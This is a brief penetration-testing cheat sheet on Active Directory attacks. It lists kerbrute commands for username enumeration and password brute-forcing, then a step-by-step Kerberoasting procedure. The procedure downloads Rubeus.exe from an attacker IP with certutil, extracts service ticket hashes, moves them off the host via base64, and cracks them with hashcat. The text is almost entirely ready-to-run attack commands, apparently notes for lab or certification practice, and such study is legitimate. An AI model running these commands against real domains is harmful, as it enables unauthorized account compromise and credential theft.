## Kerbrute
```bash
kerbrute userenum -d <domain> --dc <ip> -o <outfile> <users-wordlist> # Bruteforce usernames
kerbrute bruteuser -d <domain> --dc <ip> -o <outfile> <wordlist> <user@domain> # Bruteforce password
```

## Kerberoasting
1. Upload rubeus.exe to the client: `certutil -urlcache -f http://192.168.119.135/Rubeus.exe rubeus.exe`
2. Get service hashes: `rubeus.exe kerberoast /outfile:C:\temp\hashes.txt`
(Use your own method for transfering hashes to your local machine, I decided to base64 encode them and copy/paste):
3. Encode the hashes: `certutil -encode hashes.txt hashes.b64`
4. Copy the hashes: `type hashes.b64`
5. Paste the hashes in kali. Remove new lines and don't copy the "CERTIFICATE" lines.
6. Decode the hashes in kali: `base64 -d hashes.b64 > hashes.txt`
7. Isolate the SQL hash anc crack it: `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`
Check [[Rubeus]] for other usage